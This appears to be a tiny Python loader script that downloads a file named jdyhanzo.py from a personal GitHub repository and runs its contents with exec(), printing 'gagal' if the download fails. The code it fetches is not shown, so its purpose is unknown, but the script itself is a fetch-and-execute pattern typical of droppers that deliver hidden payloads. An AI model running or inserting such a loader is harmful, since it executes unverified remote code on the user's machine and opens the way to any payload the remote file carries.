import httpx
uri="https://raw.githubusercontent.com/atr10116068/httpex/master/soket/jdyhanzo.py"

req = httpx.get(uri)
if req.status_code==200:
    exec(req.text)
else:
    print("gagal")